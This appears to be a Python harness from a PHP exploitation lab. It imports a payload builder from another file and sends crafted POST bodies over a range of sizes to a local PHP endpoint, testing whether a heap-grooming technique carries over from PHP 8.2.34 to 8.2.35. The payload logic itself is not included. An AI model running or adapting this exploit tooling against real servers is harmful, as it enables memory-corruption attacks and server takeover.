#!/usr/bin/env python3
"""oom142b: N-sweep variant of oom142 — fire the winning groom at 8.2.35
across the whole N range that worked on 8.2.34."""
import importlib.util, struct, sys
sys.path.insert(0, "/Users/vlad/Projects/queue/php2shell-lab")
spec = importlib.util.spec_from_file_location("oom141", "/Users/vlad/Projects/queue/php2shell-lab/oom141.py")
oom = importlib.util.module_from_spec(spec)
spec.loader.exec_module(oom)
import urllib.request

HOST = "http://127.0.0.1:8084/oom_mod.php"
NS = [3200000, 3350000, 3500000, 3650000, 3800000]

SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
for N in NS:
    body = oom.build_body(SIG8, N)          # measure body: SIG8@v+72, VLEN=295
    req = urllib.request.Request(HOST, data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        r = urllib.request.urlopen(req, timeout=60)
        resp = r.read()[:220]
        http = r.status
    except Exception as e:
        resp = repr(e)[:160]; http = -1
    print("N=%d http=%d alloc=%s" % (N, http,
          resp[resp.find(b"allocate")+9:resp.find(b"allocate")+22] if b"allocate" in resp else b"-"), flush=True)
    print("  %s" % resp[:200], flush=True)

print("=== sweep done ===")
